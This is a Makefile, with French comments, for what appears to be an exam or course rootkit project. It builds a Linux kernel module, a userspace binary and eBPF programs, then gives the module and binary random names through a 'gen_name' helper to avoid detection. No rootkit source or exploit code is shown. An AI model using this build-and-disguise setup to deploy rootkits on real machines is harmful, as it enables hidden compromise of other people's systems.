obj-m += rk.o
rk-objs := rootkit.o obfs.o

# Kernel version: use .target_kver if present, else running kernel
KVER ?= $(shell cat .target_kver 2>/dev/null || uname -r)

# KDIR: prefer local build-sys-linux-<KVER> if present (exam env), else /lib/modules
BUILDSYS := $(wildcard $(PWD)/../build-sys-linux-$(KVER))
ifeq ($(BUILDSYS),)
KDIR := /lib/modules/$(KVER)/build
else
KDIR := $(BUILDSYS)
endif

PWD  := $(shell pwd)

# eBPF
CLANG      := clang
BPF_CFLAGS := -O2 -g -target bpf -D__TARGET_ARCH_x86
BPF_DIR    := ebpf
BPF_SRCS   := $(wildcard $(BPF_DIR)/*.bpf.c)
BPF_OBJS   := $(BPF_SRCS:.bpf.c=.bpf.o)

all: modules userspace ebpf

gen_name:
	gcc -Wall -Wextra -o gen_name gen_name.c

_build_module:
	@echo "[*] build module pour kernel $(KVER)"
	make -C $(KDIR) M=$(PWD) modules

_rename: _build_module
	$(eval RK_NAME := $(shell ./gen_name))
	mv rk.ko $(RK_NAME).ko
	echo "$(RK_NAME)" > .rk_name
	@echo "[+] module renommé : $(RK_NAME).ko"

modules: gen_name _build_module _rename

userspace: gen_name
	$(eval BIN_NAME := $(shell ./gen_name))
	gcc -Wall -Wextra -I$(PWD) -o $(BIN_NAME) core.c
	echo "$(BIN_NAME)" > .rk_bin_name
	@echo "[+] binaire renommé : $(BIN_NAME)"

ebpf: $(BPF_OBJS) ebpf_loader

$(BPF_DIR)/%.bpf.o: $(BPF_DIR)/%.bpf.c $(BPF_DIR)/vmlinux.h $(BPF_DIR)/rk_bpf_common.h
	$(CLANG) $(BPF_CFLAGS) -I$(BPF_DIR) -c $< -o $@

ebpf_loader:
	gcc -Wall -Wextra -I$(BPF_DIR) -o $(BPF_DIR)/rk_ebpf_loader $(BPF_DIR)/rk_ebpf_loader.c -lbpf -lelf -lz

clean:
	make -C $(KDIR) M=$(PWD) clean
	rm -f rootkit_malware $(shell cat .rk_bin_name 2>/dev/null)
	rm -f .rk_bin_name .rk_name gen_name
	rm -f $(BPF_DIR)/*.bpf.o $(BPF_DIR)/rk_ebpf_loader

.PHONY: all modules gen_name _build_module _rename userspace ebpf ebpf_loader dropper clean
